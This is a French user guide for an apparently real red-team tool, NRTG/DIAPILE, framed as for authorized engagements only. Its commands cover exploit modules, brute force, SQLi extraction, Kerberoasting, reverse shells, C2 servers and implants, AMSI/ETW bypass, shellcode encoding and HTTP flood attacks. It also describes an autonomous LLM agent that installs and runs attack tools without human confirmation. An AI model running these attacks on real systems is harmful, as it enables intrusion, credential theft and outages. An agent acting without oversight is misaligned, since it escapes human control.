# HELP — Guide d'utilisation de NRTG / DIAPILE

> **DIAPILE — Network Redteam Grapher v2.0.0**
> Binaire : `nrtg` · Crate : `network_redteam_grapher`
>
> ⚠️ **Usage exclusivement réservé aux opérations Red Team autorisées.** Toute utilisation sur une infrastructure sans autorisation écrite explicite est illégale.
>
> 📥 Installation : [INSTALL.md](INSTALL.md) · 📜 Versions : [CHANGELOG.md](CHANGELOG.md) · [VERSION](VERSION)

---

## 📑 Sommaire

1. [Aide intégrée](#-aide-intégrée)
2. [Concepts clés](#-concepts-clés)
3. [Scan réseau de base](#1--scan-réseau-de-base)
4. [Netscan (moteur type nmap)](#2--netscan-moteur-type-nmap)
5. [Réseau local & capture live](#3--réseau-local--capture-live)
6. [Exploits](#4--exploits)
7. [Bruteforce & listes externes](#5--bruteforce--listes-externes)
8. [Attaques web](#6--attaques-web)
9. [Active Directory & Kerberos](#7--active-directory--kerberos)
10. [OSINT](#8--osint)
11. [Post-exploitation, sessions, C2, pivot](#9--post-exploitation-sessions-c2-pivot)
12. [Agent IA autonome](#10--agent-ia-autonome)
13. [HORDE (coordination distribuée)](#11--horde-coordination-distribuée)
14. [Stress-test HTTP](#12--stress-test-http)
15. [Mission Pack](#13--mission-pack)
16. [Évasion EDR](#14--évasion-edr)
17. [Reporting](#15--reporting)
18. [Sorties générées](#-sorties-générées)
19. [Makefile](#-makefile)
20. [Docker](#-docker)
21. [Dépannage](#-dépannage)

---

## 🧭 Aide intégrée

L'outil embarque sa propre documentation :

```bash
nrtg                  # menu d'aide étendu (colorisé)
nrtg --features       # liste des modules et des sorties disponibles
nrtg --examples       # 10 exemples de commandes prêts à copier
nrtg --tutorial       # guide pas à pas du premier scan
nrtg --doctor         # vérification de l'environnement (deps, config, réseau, clés API)
nrtg -h               # aide courte standard (clap) — liste TOUS les flags
nrtg --update-cve-db  # télécharge/rafraîchit la base CVE depuis la NVD API v2
```

---

## 🔑 Concepts clés

| Notion | Comportement |
|---|---|
| **Dry-run (défaut)** | Les exploits sont **listés** mais aucun paquet actif n'est envoyé. L'exécution réelle nécessite `--run-exploits` (passe `run_exploits: true`). |
| **`--yes`** | Mode non-interactif : ignore les confirmations interactives (indispensable en Docker / CI). |
| **Garde-fou d'impact** | `--max-exploit-impact informational\|cred_harvest\|shell\|rce` plafonne la dangerosité des probes exécutées (défaut : `informational`). |
| **Périmètre** | `--allow-networks 10.0.,192.168.` restreint les exploits actifs ; `--deny-hosts` exclut des cibles (prioritaire). |
| **OPSEC** | Dashboard live, coordinateur HORDE et shell WS : bind sur `127.0.0.1` uniquement. `--horde-public` est requis pour écouter sur `0.0.0.0`. |
| **Redaction LLM** | `--redact-level strict\|light\|off` masque les secrets avant envoi au LLM (défaut : `strict`). |
| **Stealth scan** | `--stealth off\|default\|redteam` (pacing jitter + plafond de concurrence). `--ai-stealth` concerne l'agent IA. |
| **Clés API** | Jamais en clair : variables d'environnement (`.env`) — `OPENROUTER_API_KEY`, `OPENAI_API_KEY`, `SHODAN_API_KEY`… |

**Flags universels :**

```
-t, --targets <URL|IP:PORT,...>   -c, --config <PATH>      -o, --output <PATH>
-d, --cve-db <PATH>               -r, --risk-rules <PATH>  --parallel <N>
--http-timeout <SEC>              --tcp-timeout <SEC>      --no-infer
--csv  --md  --export-api-report  --log-level <LEVEL>      --log-format <fmt>  --log-file <PATH>
--yes  --stealth <MODE>           --redact-level <LEVEL>   --clean-outputs
```

---

## 1 · Scan réseau de base

```bash
# Scan simple HTTP + TCP avec tous les exports
nrtg -t http://prod.example:443,10.0.0.5:22,10.0.0.5:3306 \
     --csv --md --export-api-report

# CIDR complet sur un port, scan parallèle
nrtg -t 192.168.1.0/24:22 --parallel 30 --tcp-timeout 2

# Scan gateway (multi-ports), sortie personnalisée
nrtg -t 192.168.1.1:80,192.168.1.1:443,192.168.1.1:22,192.168.1.1:8080 \
     --parallel 20 --tcp-timeout 2 --http-timeout 4 \
     --csv --md --export-api-report -o gateway.json

# Mode furtif (anti-IDS) vers un périmètre autorisé
nrtg -t 10.0.0.0/24:80,10.0.0.0/24:443 --stealth redteam --parallel 8

# Cibles depuis un fichier de configuration
nrtg -c config.json --csv --md
```

---

## 2 · Netscan (moteur type nmap)

```bash
# Scan de ports (connect scan parallèle) sur un hôte / CIDR
nrtg --netscan 192.168.1.10
nrtg --netscan 192.168.1.0/24 --port-range 1-1024 --timing 3

# Découverte d'hôtes sans scan de ports
nrtg --netscan 10.0.0.0/24 --discover

# Détection de version/CPE + empreinte OS + traceroute
nrtg --netscan 10.0.0.5 --version-detect --os-detect --traceroute

# Scan SYN par paquets bruts (WSL/Linux, root ou CAP_NET_RAW requis)
sudo nrtg --netscan 10.0.0.0/24 --syn --timing 2

# UDP + scripts NSE-like + leurres (évasion) + randomisation des ports
nrtg --netscan 10.0.0.5 --netscan-udp --scripts "default,banner,http-title" \
     --decoys 5 --shuffle
```

> `--decoys` n'utilise que des adresses de documentation RFC 5737 (OPSEC).

---

## 3 · Réseau local & capture live

```bash
# Détection automatique de la gateway + scan ciblé
nrtg --scan-local

# Lister les interfaces réseau
nrtg --list-ifaces

# Capture live promiscuous (pnet) sur eth0 pendant 45 s
sudo nrtg --capture-iface eth0 --capture-duration 45 -t 192.168.1.10:22

# Capture ciblée avec filtre BPF + écriture JSON brute
sudo nrtg --capture-iface eth0 --capture-bpf "tcp port 80" \
     --capture-output capture.json --capture-max-flows 20000

# Capture intégrale (⚠️ volume important sur un réseau chargé)
sudo nrtg --capture-iface eth0 --capture-all --promiscuous --capture-duration 60
```

---

## 4 · Exploits

```bash
# Dry-run (défaut) — liste ce qui SERAIT exécuté, sans rien envoyer
nrtg -t 127.0.0.1:6379 --exploit-depth deep

# Probes actives read-only (garde-fou d'impact explicite)
nrtg -t 127.0.0.1:6379 --run-exploits --exploit-depth deep \
     --max-exploit-impact cred_harvest --yes

# Restreindre aux réseaux autorisés + exclusions
nrtg -t 10.0.0.0/24 --run-exploits --allow-networks 10.0.,192.168. \
     --deny-hosts 10.0.0.250 --yes

# Lister les modules d'exploitation RCE/SHELL disponibles
nrtg --list-exploits

# Exécuter un module précis sur une cible
nrtg --exploit vsftpd_234_backdoor --exploit-target 10.0.0.5:21 --yes

# Utiliser un manifeste de signatures alternatif
nrtg -t 10.0.0.5:6379 --exploits-config mes_signatures.yaml --run-exploits --yes
```

Manifeste par défaut : [exploits.yaml](exploits.yaml) — **29 signatures** (Redis, VSFTPD, MySQL, WinRM, Kubernetes, VNC, MQTT, Kerberos, PHP2Shell…).

> **PHP2Shell** (`PHP2SHELL-VERSION-EXPOSED`, CVE-2026-109618 / CVE-2026-109619) : détection
> **passive**. La sonde envoie un unique `GET` bénin (`/`, `/index.php`, `/info.php`) et lit la
> version exposée (`X-Powered-By: PHP/x.y.z`, `Server` ou corps) pour la comparer aux plages
> affectées (`>=8.2,<8.2.35`, `>=8.3,<8.3.36`, `>=8.4,<8.4.27`, `>=8.5,<8.5.12`). Le vecteur réel
> étant un épuisement mémoire (donc un **DoS**), aucun probe destructeur n'est jamais envoyé.
> Catégorie `vulnerable-version` → évaluée uniquement en profondeur `deep`.

```bash
# Détection PHP2Shell (profondeur deep requise pour la catégorie vulnerable-version)
nrtg -t 10.0.0.5:80 --run-exploits --exploit-depth deep --max-exploit-impact informational --yes
```

---

## 5 · Bruteforce & listes externes

```bash
# Bruteforce rapide (35 paires embarquées)
nrtg -t 10.0.0.5:22 --brute --brute-mode quick --yes

# Mode par défaut (500 paires) ou furtif (100, lent)
nrtg -t 10.0.0.5:3306 --brute --brute-mode default --yes
nrtg -t 10.0.0.5:21 --brute --brute-mode stealth --yes

# Listes externes .txt (fusion additive avec les listes embarquées)
nrtg -t 10.0.0.5:22 --brute --yes \
     --brute-users users.txt --brute-passwords pass.txt

# Remplacer les listes embarquées au lieu de fusionner
nrtg -t 10.0.0.5:22 --brute --yes \
     --brute-users users.txt --brute-passwords pass.txt --brute-lists-replace

# Installation automatique des outils tiers manquants (opt-in)
nrtg -t 10.0.0.5:22 --brute --yes --auto-install
```

**Format des fichiers** : une entrée par ligne, `#` = commentaire, lignes vides ignorées, `trim` + dédoublonnage automatiques. Plafond : **100 000 entrées**.

**`--auto-install`** : permet à l'agent d'installer **n'importe quel outil tiers** dont il a besoin pendant une mission. Détecte le gestionnaire de paquets (apt / dnf / yum / pacman / zypper / apk / brew / winget / pip) puis installe le binaire absent. Un registre interne mappe les outils connus (`sshpass`, `impacket-*`, `hydra`, `medusa`, `nmap`, `nxc`, `bloodhound-python`, `msfvenom`, …) ; **tout autre binaire est tenté avec son propre nom comme paquet**. Appliqué au bruteforce SSH (`sshpass`), à Kerberoast / Pass-the-Hash / DCSync (`impacket-*`), au password spray Kerberos (`kinit`, paquet `krb5-user`), à la génération de payload Meterpreter (`msfvenom`) et au repli bruteforce (`hydra`).

**Opt-in** : sans ce flag, l'agent reste *fail-closed* — il n'installe rien, affiche la commande d'installation exacte puis poursuit la mission sans blocage. Le consentement est demandé interactivement (ou auto-accordé via `--yes`).

**Garde-fou par niveau de risque** : chaque outil est classé `Low` / `Medium` / `High` / `Unknown`. Seuls les utilitaires `Low` (diagnostic réseau : `ip`, `nmap`, `tcpdump`, `sshpass`…) peuvent être auto-confirmés par `--yes`. Un outil `Medium`/`High` (hydra, sqlmap, impacket-*, msfvenom…) **ou totalement inconnu** exige une confirmation humaine explicite, même avec `--yes`.

**`--autonomous`** : autorise le **mode autonome** — lève le verrou de confirmation ci-dessus et permet une exécution totalement non-interactive. Ce flag **implique `--auto-install` et `--yes`**. À utiliser pour l'orchestration par agent / CI, jamais en supervision humaine. Chaque installation reste tracée dans le journal d'audit (niveau de risque inclus) pour permettre un contrôle *a posteriori*.

```bash
# Agent autonome : installe et confirme sans intervention
nrtg -t 10.0.0.5 --ai-agent --autonomous
```

**Usage effectif** : une fois un outil tiers présent, l'agent ne se contente pas de l'installer — il l'**exécute réellement** (action `external_tool`) via un registre de capacités (intention → outil) et **injecte sa sortie parsée** dans la mémoire de campagne. Détail et catalogue complet : voir **10 · Agent IA autonome**.

**Robustesse** : validation anti-injection des noms de paquets, diagnostic d'échec (lock, réseau, paquet introuvable, droits), retry intelligent des seules erreurs transitoires (AIMD), repli `pip3` si pertinent, et suggestion du paquet le plus proche (similarité trigramme) en cas d'échec `PackageNotFound`.

**Journal d'audit** : chaque tentative est tracée dans `diapile_installs.log` (horodatage, binaire, paquet, niveau de risque, résultat). Le module relit cet historique pour estimer la probabilité de succès d'une installation (lissage de Laplace) et avertir en cas d'échecs passés structurels.

**Protocoles supportés** : FTP, Redis, PostgreSQL, HTTP, WinRM, SSH, SMTP, IMAP, POP3, LDAP, MSSQL, SMB2/3.1.1 (NTLM / Pass-the-hash), MySQL, MongoDB, VNC, RDP.

---

## 6 · Attaques web

```bash
# Scan d'injections (SQLi, XSS, SSRF, LFI, XXE, CMDi, open redirect)
nrtg --web-scan https://lab.local

# Crawl + injections
nrtg --web-spider https://lab.local --spider-pages 50 --spider-depth 4

# Avec contexte d'authentification
nrtg --web-scan https://lab.local \
     --cookie "PHPSESSID=abc; csrftoken=xyz" --bearer "eyJhbGci..."
nrtg --web-scan https://lab.local --header "X-Api-Key: abc"

# Extraction de données via SQLi / exploitation auto (⚠️ actif)
nrtg --sqli-extract "https://lab.local/item?id=1" --web-exploit --yes

# Payloads externes par famille (répétable ; colonnes séparées par TAB)
#   format : payload [TAB] marqueur_detection_optionnel   (ssti = 3 colonnes)
nrtg --web-scan https://lab.local \
     --web-payloads sqli=mes_sqli.txt --web-payloads xss=mes_xss.txt
nrtg --web-scan https://lab.local --web-payloads sqli=mes_sqli.txt --web-payloads-replace

# Spider : extensions statiques supplémentaires exclues du crawl
nrtg --web-spider https://lab.local --spider-ext exclusions.txt

# Modules spécialisés
nrtg --ssti-scan https://lab.local
nrtg --cors-scan https://lab.local
nrtg --smuggling-scan https://lab.local
nrtg --graphql-scan https://lab.local/graphql
nrtg --oauth2-scan https://lab.local/oauth/authorize
nrtg --jwt-analyze "eyJhbGciOiJub25lIn0..."

# Confirmation out-of-band de vulns aveugles (SSRF/XXE/CMDi)
nrtg --web-scan https://lab.local --oob-bind 127.0.0.1:0 \
     --oob-host mon-relais.example:8080
nrtg --web-scan https://lab.local --oob-dns-bind 127.0.0.1:5353 \
     --oob-dns-domain test.example

# Rotation de proxies (évasion WAF / répartition)
nrtg --web-scan https://lab.local --proxy http://127.0.0.1:8080 \
     --proxy-file proxies.txt --no-waf-bypass
```

**Format des payloads** : une entrée par ligne, colonnes séparées par **TAB**, marqueur de détection optionnel. Fusion additive par défaut (`--web-payloads-replace` pour substituer la famille). Plafond : **20 000 entrées par famille**.

---

## 7 · Active Directory & Kerberos

```bash
# Mode AD (reconnaissance via le contrôleur de domaine)
nrtg --dc-ip 10.0.0.10 --ad-domain corp.local --ad-user j.doe --ad-pass 'P@ssw0rd'

# AS-REP Roasting (wire protocol Kerberos)
nrtg --asrep-roast --dc-ip 10.0.0.10 --userlist users.txt

# Kerberoasting (via impacket : --dc-ip + --ad-user + --ad-pass requis)
nrtg --kerberoast --dc-ip 10.0.0.10 --ad-domain corp.local \
     --ad-user j.doe --ad-pass 'P@ssw0rd'

# Password spraying Kerberos (délai anti-lockout)
nrtg --dc-ip 10.0.0.10 --userlist users.txt \
     --spray-password 'Hiver2026!' --spray-delay 2000
```

---

## 8 · OSINT

```bash
# Reconnaissance OSINT passive sur un domaine
nrtg --osint example.com

# Avec clés API dédiées (ou .env : SHODAN_API_KEY, etc.)
nrtg --osint example.com --shodan-key <KEY> --github-key <KEY> --hibp-key <KEY>
```

---

## 9 · Post-exploitation, sessions, C2, pivot

```bash
# Sessions shell
nrtg --sessions                       # lister les sessions actives
nrtg --interact 1                     # interagir avec la session #1
nrtg --post-exploit 1                 # post-exploitation auto (dump creds, privesc, réseau)

# Payloads reverse shell
nrtg --payload --payload-type powershell
nrtg --listen --lhost 10.0.0.5 --lport 4444

# Serveurs C2
nrtg --c2-server --c2-port 8443                       # C2 HTTP (beacon polling)
nrtg --ws-c2 --ws-c2-port 8444                        # C2 WebSocket (push de tâches)
nrtg --ws-shell --ws-shell-port 8445                  # shell interactif WS (127.0.0.1)
nrtg --ws-beacon 10.0.0.5:8444                        # générer payloads beacon WS

# Implant généré (Python + PowerShell)
nrtg --gen-implant http://10.0.0.5:8443 --implant-persist --implant-kill-date 2026-12-31

# Pivot / tunneling
nrtg --socks-proxy --socks-port 1080                  # proxy SOCKS5 local
nrtg --socks-via-session 1 --socks-session-port 1081  # SOCKS5 routé via une session shell

# Dashboard live (bind 127.0.0.1 uniquement)
nrtg -t 10.0.0.0/24 --dashboard-live --dashboard-port 24601
```

---

## 10 · Agent IA autonome

```bash
# Lancer l'agent (cycle : recon → plan LLM → confirmation → exécution → mémoire → rapport)
nrtg --ai-agent --targets 192.168.1.0/24 \
     --objective "identifier les hôtes vulnérables et tenter un premier accès"

# Mode furtif (low & slow, anti-IDS)
nrtg --ai-agent --ai-stealth --targets 10.0.0.0/24 \
     --objective "pivot interne depuis 10.0.0.5"

# Reprendre une campagne après interruption
nrtg --ai-agent --session-id op-20261028-143022 \
     --targets 192.168.1.0/24 --objective "compromettre le contrôleur de domaine"

# Forcer la confirmation humaine pour TOUTES les actions
nrtg --ai-agent --confirm-all --targets 192.168.1.0/24

# Apprentissage par renforcement (actif par défaut ; désactivable)
nrtg --ai-agent --no-rl-learn --targets 192.168.1.0/24
```

| Option | Défaut | Description |
|---|---|---|
| `--ai-agent` | false | Active le mode agent IA autonome |
| `--objective <GOAL>` | « identifier les hôtes vulnérables… » | Objectif de la mission |
| `--session-id <ID>` | auto (timestamp) | Reprendre une campagne existante |
| `--sessions-dir <DIR>` | `./sessions` | Dossier de persistance |
| `--ai-stealth` | false | Mode low & slow de l'agent |
| `--confirm-all` | false | Confirmation pour toutes les actions |
| `--rl-learn` / `--no-rl-learn` | actif | Apprentissage par renforcement de la kill-chain |

### Exécution d'outils tiers (`external_tool`)

L'agent ne se contente plus de **suggérer** une commande : il peut **installer puis exécuter réellement** un outil tiers et **réinjecter sa sortie** dans la mémoire de campagne. Deux mécanismes complémentaires :

- **Registre de capacités** (`ai/capability_registry.rs`) — le LLM n'a plus à deviner le binaire. Il exprime une **intention** (champ `technique`, ex. « fuzzing de répertoires ») ; le registre choisit le **premier outil présent dans le `PATH`** parmi des candidats ordonnés, puis génère les arguments (`{host}`, `{port}`, `{target}`, `{url}`, `{wordlist}`, `{userlist}`, `{passlist}`, `{hashfile}`). Le catalogue complet est injecté dans le prompt du planificateur, donc le modèle connaît les intentions reconnues.
- **Parsing structuré** (`ai/tool_parsers.rs`) — la sortie brute est convertie en **artefacts typés** et injectée automatiquement : ports/services → `HostMemory.services`, chemins web → `WebSurface.endpoints`, identifiants vérifiés + hashs Kerberos/NTLM → `credentials`, SQLi → hypothèses, avis/CVE → notes, DNS/comptes → notes.

Sorties reconnues : `nmap`, `ffuf`/`gobuster`/`feroxbuster`/`dirb`, `sqlmap`, `hydra`/`medusa`/`ncrack`, `john`/`hashcat`, `snmpwalk`, `ldapsearch`, `nikto`/`whatweb`, `nuclei`/`wpscan`, `dnsrecon`/`dnsenum`/`fierce`, `kerbrute`, `impacket-GetUserSPNs`/`GetNPUsers`, `impacket-secretsdump`, `smtp-user-enum`, `searchsploit`, `gowitness`, `nxc`.

**26 capacités reconnues :**

| Capacité (`id`) | Outils (ordre de préférence) |
|---|---|
| scan de ports (`port_scan`) | nmap → masscan → naabu |
| empreinte de service (`service_fingerprint`) | nmap |
| fuzzing de répertoires (`web_dir_fuzz`) | ffuf → feroxbuster → gobuster → dirb |
| analyse de vulnérabilités web (`web_scan`) | nikto → whatweb |
| exploration web / crawl (`web_crawl`) | katana → gospider |
| énumération d'hôtes virtuels (`vhost_enum`) | ffuf |
| injection SQL (`sql_injection`) | sqlmap |
| bruteforce d'authentification (`credential_brute`) | hydra → medusa → ncrack |
| cassage de hash (`hash_crack`) | hashcat → john |
| énumération SNMP (`snmp_enum`) | snmpwalk → snmp-check → onesixtyone |
| énumération LDAP (`ldap_enum`) | ldapsearch → nmap |
| énumération SMB (`smb_enum`) | nxc → smbmap → smbclient → enum4linux-ng |
| énumération de sous-domaines (`subdomain_enum`) | subfinder → amass |
| analyse TLS/SSL (`tls_scan`) | sslscan → testssl.sh → testssl |
| scan de vulnérabilités applicatives (`web_vuln_scan`) | nuclei → wpscan → wapiti → droopescan |
| énumération DNS (`dns_enum`) | dnsrecon → dnsenum → fierce → dig |
| énumération SMTP (`smtp_enum`) | smtp-user-enum → nmap → swaks |
| pivot / tunnel (`pivot_tunnel`) | chisel → ligolo-ng → socat → ssh |
| outillage Kerberos/AD (`kerberos_tooling`) | kerbrute → impacket-GetUserSPNs → impacket-GetNPUsers → bloodhound-python |
| énumération ADCS (`adcs_enum`) | certipy → petitpotam |
| exécution distante (`remote_exec`) | evil-winrm → impacket-psexec → impacket-wmiexec → nxc |
| extraction d'identifiants (`credential_dump`) | impacket-secretsdump → nxc → lsassy |
| capture d'écran web (`web_screenshot`) | gowitness → eyewitness |
| lancement de canal C2 (`c2_launch`) | msfconsole → sliver-client |
| recherche d'exploit (`exploit_search`) | searchsploit |
| capture de trafic (`packet_capture`) | tcpdump → tshark |

```bash
# Mode autonome : l'agent installe, exécute et parse les outils tiers sans intervention
nrtg --ai-agent --autonomous --targets 10.0.0.0/24 \
     --objective "cartographier et exploiter les services exposés"
```

---

## 11 · Rapport IA (LLM)

```bash
# Rapport IA via OpenRouter
nrtg -t http://lab:80 --ai-report --ai-targets 10 \
     --llm-provider openrouter --llm-model mistralai/mistral-7b-instruct:free

# IA locale Ollama (100% local, zéro clé API, zéro exfiltration)
nrtg -t http://lab:80 --ai-report \
     --llm-provider ollama --llm-api-base http://localhost:11434 --llm-model llama3

# Clé API via variable d'environnement dédiée
nrtg -t http://lab:80 --ai-report --llm-api-key-env OPENROUTER_API_KEY
```

---

## 12 · HORDE (coordination distribuée)

```bash
# Coordinateur (serveur WS + CLI interactive) — bind 127.0.0.1 par défaut (OPSEC)
nrtg --horde-coordinator --horde-port 9443 --horde-total-bots 1000

# Exposer publiquement (⚠️ préférer un VPN/Tailscale)
nrtg --horde-coordinator --horde-public --horde-bind 0.0.0.0 \
     --horde-key <64_hex> --horde-duration 300 --horde-adapt auto

# Worker (se connecte au coordinateur)
nrtg --horde-worker wss://10.0.0.1:9443
```

---

## 13 · Stress-test HTTP

> ⚠️ **Tests de résilience uniquement, sur infrastructure autorisée.**

```bash
# Flood HTTP GoldenEye
nrtg --dos-goldeneye https://lab.local --dos-mode flood --dos-duration 60

# Slowloris / RUDY / BrowserFlood (personas navigateur modernes)
nrtg --dos-goldeneye https://lab.local --dos-mode slowloris --dos-bots 50
nrtg --dos-goldeneye https://lab.local --dos-mode rudy --dos-rudy-delay 1000
nrtg --dos-goldeneye https://lab.local --dos-mode browser \
     --dos-browser-paths /,/login,/api/health

# Détails de réglage
nrtg --dos-goldeneye https://lab.local --dos-workers 20 --dos-sockets-per-worker 500 \
     --dos-method random --dos-useragents ua.txt \
     --dos-connect-timeout 5000 --dos-read-timeout 3000 --dos-debug
```

---

## 14 · Mission Pack

Persistance de campagne chiffrée **AES-256-GCM + HKDF(SHA256)** :

```bash
# Créer un pack de mission
nrtg --mission-new op-client.mission --mission-name "Audit ACME" \
     --mission-scope "périmètre 10.0.0.0/24 uniquement" \
     --mission-targets 10.0.0.0/24,10.0.1.5 \
     --mission-operator j.doe
# (clé recommandée via la variable d'env C2_MASTER_KEY ; sinon --mission-password)

# Ouvrir + lister + annoter + capturer automatiquement les nodes d'un scan
nrtg --mission-open op-client.mission --mission-list
nrtg --mission-open op-client.mission --mission-add-note "Découverte DC" \
     --mission-note-body "SMB signing désactivé" --mission-note-tags smb,ad
nrtg --mission-open op-client.mission --mission-autocapture -t 10.0.0.0/24 --yes

# Exporter (anonymisé selon --redact-level) / clôturer avec secure wipe (NIST SP 800-88)
nrtg --mission-open op-client.mission --mission-export-json livrable.json
nrtg --mission-open op-client.mission --mission-close-wipe
```

---

## 15 · Évasion EDR

```bash
# Générer les stagers d'évasion (AMSI bypass, ETW patch, shellcode polymorphe)
nrtg --gen-evasion --amsi-variant ForcedError

# Encoder un shellcode (XOR rolling polymorphe)
nrtg --encode-shellcode fc4883e4f0... --encode-seed 0x37
```

---

## 16 · Reporting

```bash
# Rapport de pentest professionnel (HTML + Markdown)
nrtg -t 10.0.0.0/24 --pentest-report --client-name "ACME Corp" --csv --md

# Layer MITRE ATT&CK Navigator JSON depuis les findings du dernier scan
nrtg --attack-layer

# Export complet (MD + HTML + JSON + risk matrix + ATT&CK layer) dans un dossier
nrtg -t 10.0.0.0/24 --export-full ./rapports

# Nettoyer les sorties (secure-wipe 3 passes) en fin de run
nrtg -t 10.0.0.0/24 --csv --md --clean-outputs
```

---

## 📂 Sorties générées

| Fichier | Description |
|---|---|
| `graph.json` | Graphe complet (nœuds + liens + métadonnées) |
| `graph.extras.json` | Sidecar : findings exploits, WAF/OS/tech, analyses IA |
| `graph.csv` | Plat CSV importable Sheets/Excel |
| `graph.md` | Résumé Markdown humain |
| `graph.api.json` | ApiReport JSON structuré |
| `graph.report.html` | **Rapport DIAPILE standalone** (dark theme, zero CDN) |
| `graph.ai-report.md` | Rapport narratif IA (si `--ai-report`) |

---

## 🛠 Makefile

```bash
make help                       # menu des commandes disponibles
make build                      # binaire Rust release local (target/release/nrtg)
make build-docker               # image Docker nrtg:latest
make up / down / restart / logs # lab de simulation local (nginx/redis/ssh/smtp/ftp)

make scan TARGETS="10.0.0.5:80,10.0.0.5:22"   # build Docker + scan
make scan-ai TARGETS="10.0.0.0/24:80"         # scan + rapport IA (OPENROUTER_API_KEY requis)
make scan-native TARGETS="http://lab:443"     # scan Rust local (sans Docker)
make scan-brute TARGETS="10.0.0.5:22" \
     BRUTE_EXTRA="--brute-users /app/lists/users.txt --brute-passwords /app/lists/pass.txt"
make scan-web WEB_URL=https://lab.local \
     WEB_EXTRA="--web-payloads sqli=/app/lists/sqli.txt"
make scan-local                 # détection gateway + scan réseau local

make doctor                     # vérification de l'environnement
make report                     # affiche le dernier rapport Markdown
make update-cve                 # met à jour la base CVE (NVD)
make test / lint / check / dash / clean
```

> Les fichiers de listes placés dans `./lists/` sont montés en lecture seule dans `/app/lists` pour `scan-brute` et `scan-web`.

---

## 🐳 Docker

```bash
# Build
docker build -t nrtg:latest .

# Scan d'un lab local
docker run --rm -v "${PWD}/out:/app/out" \
  --add-host=host.docker.internal:host-gateway \
  nrtg:latest -t http://host.docker.internal:8080,host.docker.internal:6379 \
  --csv --md --export-api-report

# Capture LIVE (Linux uniquement)
docker run --rm --network host --cap-add=NET_RAW \
  -v "${PWD}/out:/app/out" \
  nrtg:latest --capture-iface eth0 --capture-duration 45

# Variante IA via compose
docker compose -f docker-compose.ai.yml run --rm nrtg
```

---

## 🔧 Configuration LLM

`.env` (copier depuis `.env.example`) :

```bash
OPENROUTER_API_KEY=sk-or-v1-xxxxxxxxxx   # Option A — OpenRouter
OPENAI_API_KEY=sk-xxxxxxxxxx             # Option B — OpenAI
# Option C — Ollama local : aucune clé requise
```

`config.json` :

```json
{
  "options": {
    "llm_provider": "openrouter",
    "llm_model": "mistralai/mistral-7b-instruct:free",
    "llm_api_key_env": "OPENROUTER_API_KEY"
  }
}
```

---

## 🩺 Dépannage

| Symptôme | Cause | Solution |
|---|---|---|
| `link.exe not found` | VS Build Tools C++ absent | `winget install Microsoft.VisualStudio.2022.BuildTools` ou `install.ps1` |
| `cannot find -lPacket` | NPCAP absent (Windows) | Installer NPCAP : [npcap.com](https://npcap.com) |
| `dlltool not found` | llvm-mingw absent du PATH | Ajouter `tools\llvm-mingw-20240619-ucrt-x86_64\bin` au PATH |
| `libpcap not found` | libpcap-dev manquant (Linux) | `sudo apt-get install libpcap-dev` |
| `OPENSSL_DIR not set` | OpenSSL absent (macOS) | `brew install openssl` puis relancer `install.sh` |
| `HTTP 404 LLM` | Modèle indisponible | Changer `--llm-model` (ex : `mistralai/mistral-7b-instruct:free`) |
| `0 hosts reachable` | Firewall bloque les ports | Essayer d'autres ports : 80, 443, 53, 22 |
| Build OOM | Trop de jobs | `cargo build -j2` |

Diagnostic complet :

```bash
nrtg --doctor
cargo run -- -t http://localhost:8080 --md
```

---

**DIAPILE — Visualiser, Comprendre, Conquérir.**
*Réservé aux opérations Red Team autorisées. MIT License.*
